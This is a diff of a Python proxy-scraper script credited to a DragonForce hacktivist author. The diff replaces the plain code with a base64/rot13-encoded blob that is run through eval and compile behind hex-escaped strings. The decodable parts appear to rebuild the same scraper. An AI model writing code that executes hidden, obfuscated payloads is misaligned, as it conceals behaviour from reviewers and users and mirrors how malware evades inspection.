@@ -1,74 +1,10 @@
 # Author: Pari Malam
-import requests
-from colorama import Fore, Style
-
-def banners():
-    print(f"""{Style.BRIGHT + Fore.RED}
-    ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
-    ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
-    ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
-    ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
-    ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
-    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
-                                                                                                                
-    {Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════{Style.BRIGHT + Fore.YELLOW}  
-    Coded By       :     Pari Malam
-    Description    :     Proxy Auto Scrapper [#OpsPETIR CyberTroopers]
-
-    Forum          :     https://dragonforce.io
-    Github         :     https://github.com/Pari-Malam
-    Telegram       :     https://telegram.me/DragonForceIO     I think, ur face got problemo? hehe boiss :P
-    {Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════""")
-banners()
-
-options = {
-    1: {"country": "all", "timeout": "750"},
-    2: {"country": "US", "timeout": "750"},
-    3: {"country": "RU", "timeout": "1000"},
-    4: {"country": "UA", "timeout": "1000"},
-    5: {"country": "IN", "timeout": "1000"},
-    6: {"country": "IT", "timeout": "1000"},
-    7: {"country": "CA", "timeout": "1000"},
-    8: {"country": "FR", "timeout": "1000"},
-    9: {"country": "TH", "timeout": "1000"},
-    10: {"country": "PL", "timeout": "1000"},
-    11: {"country": "NL", "timeout": "2100"},
-    12: {"country": "MX", "timeout": "1500"},
-    13: {"country": "KZ", "timeout": "1500"},
-    14: {"country": "IR", "timeout": "1500"},
-    15: {"country": "EG", "timeout": "1500"},
-    16: {"country": "HK", "timeout": "2250"},
-    17: {"country": "DE", "timeout": "1500"},
-    18: {"country": "VN", "timeout": "1500"},
-    19: {"country": "HU", "timeout": "1500"},
-    20: {"country": "BR", "timeout": "1500"},
-    21: {"country": "JP", "timeout": "1500"},
-    22: {"country": "KH", "timeout": "1500"},
-    23: {"country": "CN", "timeout": "1250"}
-}
-
-while True:
-    country_code = input(f"{Fore.GREEN}\nEnter a country code (type 'all' for all countries): {Style.RESET_ALL}")
-    if country_code == "all" or country_code.upper() in options.values():
-        break
-    print(f"{Fore.RED}Invalid country code, please try again.{Style.RESET_ALL}")
-
-while True:
-    try:
-        print(f"{Fore.RED}{'Options:':<10}{'Country':<10}{'Timeout':<10}{Style.RESET_ALL}")
-        for op, option in options.items():
-            print(f"{Fore.GREEN}{op:<10}{option['country']:<10}{option['timeout']:<10}{Style.RESET_ALL}")
-        op = int(input(f"{Fore.CYAN}Enter an option - [1-23]: {Style.RESET_ALL}"))
-        if op in options:
-            break
-        print(f"{Fore.RED}Invalid option, please try again.{Style.RESET_ALL}")
-    except ValueError:
-        print(f"{Fore.RED}Invalid input, please try again.{Style.RESET_ALL}")
-
-url = f"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout={options[op]['timeout']}&country={options[op]['country']}"
-proxies = requests.get(url).text
-
-with open("proxy.txt", "w") as f:
-    f.write(proxies)
-
-print(f"{Fore.GREEN}Proxies saved to 'proxy.txt'.{Style.RESET_ALL}")
+# Jangan malu jangan segan, tak ada apa pun dalam ni hehe.
+import base64, codecs
+magic = 'IyBBdXRob3I6IFBhcmkgTWFsYW0NCmltcG9ydCByZXF1ZXN0cw0KZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgU3R5bGUNCg0KZGVmIGJhbm5lcnMoKToNCiAgICBwcmludChmIiIie1N0eWxlLkJSSUdIVCArIEZvcmUuUkVEfQ0KICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZcg4paI4paI4paI4pWXICAg4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgIOKWiOKWiOKVlyDilojilojilojilojilojilojilZcgDQogICAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdIOKWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWXDQogICAg4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilojilZHilojilojilZEgIOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVlyDilojilojilZHilojilojilojilojilojilZcgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAgICAg4paI4paI4paI4paI4paI4pWXICAgICDilojilojilZHilojilojilZEgICDilojilojilZENCiAgICDilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKVl+KWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZ0gICAgIOKWiOKWiOKVkeKWiOKWiOKVkSAgIOKWiOKWiOKVkQ0KICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAg4paI4'
+love = 'cnV4cJE4cnV4cnV4cJEVPQvybwvybwvyMUvyMevybwvybwvybwvybwvybwvybwvyMGvyM3vyMevybwvybwvybwvybwvybwvybwvyMGvyM3vybwvybwvyMRt4cJn4cnV4cnV4cnV4cnV4cJE4cnV4cnV4cJEVPNtVPQvyMevybwvybwvybwvybwvybwvybwvyMGvyM3vybwvybwvyMRtVBXJvBXJvBXIxrXIzhXJvBXJvBXJvBXJvBXJvBXJvBXIy+XJvBXJvBXJvBXJvBXJvBXJvBXJvBXIy+XJvBXJvBXIy+XJvBXJvBXIxrXIzhXJvBXJvBXJvBXJvBXJvBXJvBXIyBXIaD0XVPNtVBXIzhXIxBXIxBXIxBXIxBXIxBXIaFQvyMevyMQvyM0tVBXIzhXIxBXIarXIzhXIxBXIaFNt4cJn4cJD4cJqVBXIzhXIxBXIxBXIxBXIxBXIxBXIaFNt4cJn4cJD4cJD4cJD4cJD4cJD4cJqVBXIzhXIxBXIaFNt4cJn4cJD4cJD4cJD4cJq4cJn4cJD4cJqVPNtVPNt4cJn4cJD4cJD4cJD4cJD4cJD4cJqVBXIzhXIxBXIaFNt4cJn4cJD4cJqVBXIzhXIxBXIxBXIxBXIxBXIxBXIarXIzhXIxBXIxBXIxBXIxBXIxBXIxBXIarXIzhXIxBXIarXIzhXIxBXIaFQvyMevyMQvyMQvyMQvyMQvyMQvyM0tQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtQDbtVPNtr0MipzHhI0uWIRI94cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJDr1A0rJkyYxWFFHqVIPNeVRMipzHhJHIZGR9KsFNtQDbtVPNtD29xMJDtDaxtVPNtVPNtBvNtVPNtHTSlnFOALJkuoD0XVPNtVREyp2AlnKO0nJ9hVPNtVQbtVPNtVSOlo3u5VRS1qT8tH2AlLKOjMKVtJlACpUADEIEWHvOQrJWypyElo29jMKWmKD0XQDbtVPNtEz9lqJ0tVPNtVPNtVPNtBvNtVPNtnUE0pUZ6Yl9xpzSao25zo3WwMF5coj0XVPNtVRqcqTu1LvNtVPNtVPNtVQbtVPNtVTu0qUOmBv8iM2y0nUIvYzAioF9DLKWcYH1uoTSgQDbtVPNtITIfMJqlLJ0tVPNtVPNtBvNtVPNtnUE0pUZ6Yl90MJkyM3WuoF5gMF9RpzSao25To3WwMHyCVPNtVPOWVUEbnJ5eYPO1pvOzLJAyVT'
+god = 'dvdCBwcm9ibGVtbz8gaGVoZSBib2lzcyA6UA0KICAgIHtGb3JlLldISVRFfeKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIiIikNCmJhbm5lcnMoKQ0KDQpvcHRpb25zID0gew0KICAgIDE6IHsiY291bnRyeSI6ICJhbGwiLCAidGltZW91dCI6ICI3NTAifSwNCiAgICAyOiB7ImNvdW50cnkiOiAiVVMiLCAidGltZW91dCI6ICI3NTAifSwNCiAgICAzOiB7ImNvdW50cnkiOiAiUlUiLCAidGltZW91dCI6ICIxMDAwIn0sDQogICAgNDogeyJjb3VudHJ5IjogIlVBIiwgInRpbWVvdXQiOiAiMTAwMCJ9LA0KICAgIDU6IHsiY291bnRyeSI6ICJJTiIsICJ0aW1lb3V0IjogIjEwMDAifSwNCiAgICA2OiB7ImNvdW50cnkiOiAiSVQiLCAidGltZW91dCI6ICIxMDAwIn0sDQogICAgNzogeyJjb3VudHJ5IjogIkNBIiwgInRpbWVvdXQiOiAiMTAwMCJ9LA0KICAgIDg6IHsiY291bnRyeSI6ICJGUiIsICJ0aW1lb3V0IjogIjEwMDAifSwNCiAgICA5OiB7ImNvdW50cnkiOiAiVEgiLCAidGltZW91dCI6ICIxMDAwIn0sDQogICAgMTA6IHsiY291bnRyeSI6ICJQTCIsICJ0aW1lb3V0IjogIjEwMDAifSwNCiAgICAxMTogeyJjb3VudHJ5IjogIk5MIiwgInRpbWVvdXQiOiAiMjEwMCJ9LA0KICAgIDEyOiB7ImNvdW50cnkiOiAiTVgiLCAidGltZW91dCI6ICIxNTAwIn0sDQogICAgMTM6IHsiY291bnRyeSI6ICJLWiIsICJ0aW1lb3V0IjogIjE1MDAifSwNCiAgICAxNDogeyJjb3VudHJ5IjogIklSIiwgInRpbWVvdXQiOiAiMTUwMCJ9LA0KICAgIDE1OiB7ImNvdW50cnkiOiAiRUciLCAidGltZW91dCI6ICIxNTAwIn0sDQogICAgMTY6IHsiY291bnRyeSI6ICJISyIsICJ0aW1lb3V0IjogIjIyNTAifSwNCiAgICAxNzogeyJjb3VudHJ5IjogIkRFIiwgInRpbWVvdXQiOiAiMTUwMCJ9LA0KICAgIDE4OiB7ImNvdW50cnkiOiAiVk4iLCAidGltZW91dCI6ICIxNTAwIn0sDQogICAgMTk6IHsiY291bnRyeSI6ICJIVSIsICJ0aW1lb3V0IjogIjE1MDAifSwNCiAgICAyMDogeyJjb3VudHJ5IjogIkJSIiwgInRpbWVvdXQiOiAiMTUwMCJ9LA0'
+destiny = 'XVPNtVQVkBvO7VzAiqJ50paxvBvNvFyNvYPNvqTygMJ91qPV6VPVkAGNjVa0fQDbtVPNtZwV6VUfvL291oaElrFV6VPWYFPVfVPW0nJ1yo3I0VwbtVwR1ZQNvsFjAPvNtVPNlZmbtrlWwo3IhqUW5VwbtVxABVvjtVaEcoJIiqKDvBvNvZGV1ZPW9QDc9QDbAPaqbnJkyVSElqJH6QDbtVPNtL291oaElrI9wo2EyVQ0tnJ5jqKDbMvW7Ez9lMF5UHxISGa1poxIhqTIlVTRtL291oaElrFOwo2EyVPu0rKOyVPquoTjaVTMipvOuoTjtL291oaElnJImXGbtr1A0rJkyYyWSH0IHK0SZGU0vXD0XVPNtVTyzVTAiqJ50paysL29xMFN9CFNvLJkfVvOipvOwo3IhqUW5K2AiMTHhqKOjMKVbXFOcovOipUEco25mYaMuoUIypltcBt0XVPNtVPNtVPOvpzIunj0XVPNtVUOlnJ50XTLvr0MipzHhHxIRsHyhqzSfnJDtL291oaElrFOwo2EyYPOjoTIup2HtqUW5VTSaLJyhYagGqUyfMF5FEIASIS9OGRk9VvxAPt0Xq2ucoTHtIUW1MGbAPvNtVPO0pax6QDbtVPNtVPNtVUOlnJ50XTLvr0MipzHhHxIRsKfaG3O0nJ9hpmbaBwjkZU17W0AiqJ50paxaBwjkZU17W1EcoJIiqKDaBwjkZU17H3E5oTHhHxIGEIEsDHkZsFVcQDbtVPNtVPNtVTMipvOipPjto3O0nJ9hVTyhVT9jqTyioaZhnKEyoKZbXGbAPvNtVPNtVPNtVPNtVUOlnJ50XTLvr0MipzHhE1WSEH59r29jBwjkZU17o3O0nJ9hJlqwo3IhqUW5W106CQRjsKgipUEco25oW3EcoJIiqKDaKGb8ZGO9r1A0rJkyYyWSH0IHK0SZGU0vXD0XVPNtVPNtVPOipPN9VTyhqPucoaO1qPuzVagTo3WyYxAMDH59EJ50MKVtLJ4to3O0nJ9hVP0tJmRgZwAqBvO7H3E5oTHhHxIGEIEsDHkZsFVcXD0XVPNtVPNtVPOcMvOipPOcovOipUEco25mBt0XVPNtVPNtVPNtVPNtLaWyLJfAPvNtVPNtVPNtpUWcoaDbMvW7Ez9lMF5FEHE9FJ52LJkcMPOipUEco24fVUOfMJSmMFO0paxtLJqunJ4hr1A0rJkyYyWSH0IHK0SZGU0vXD0XVPNtVTI4L2IjqPOJLJk1MHIlpz9lBt0XVPNtVPNtVPOjpzyhqPuzVagTo3WyYyWSEU1WoaMuoTyxVTyhpUI0YPOjoTIup2HtqUW5VTSaLJyhYagGqUyfMF5FEIASIS9OGRk9VvxAPt0XqKWfVQ0tMvWbqUEjpmbiY2SjnF5jpz94rKAwpzSjMF5wo20iqwViC3WypKIyp3D9MTympTkurKOlo3ucMKZzpUWiqT9wo2j9LJkfWaEcoJIiqKD9r29jqTyioaAoo3OqJlq0nJ1yo3I0W119WzAiqJ50pax9r29jqTyioaAoo3OqJlqwo3IhqUW5W119Vt0XpUWirTyyplN9VUWypKIyp3EmYzqyqPu1pzjcYaEyrUDAPt0Xq2y0nPOipTIhXPWjpz94rF50rUDvYPNvqlVcVTSmVTL6QDbtVPNtMv53pzy0MFujpz94nJImXD0XQDcjpzyhqPuzVagTo3WyYxqFEHIBsIOlo3ucMKZtp2S2MJDtqT8tW3Olo3u5YaE4qPphr1A0rJkyYyWSH0IHK0SZGU0vXD=='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
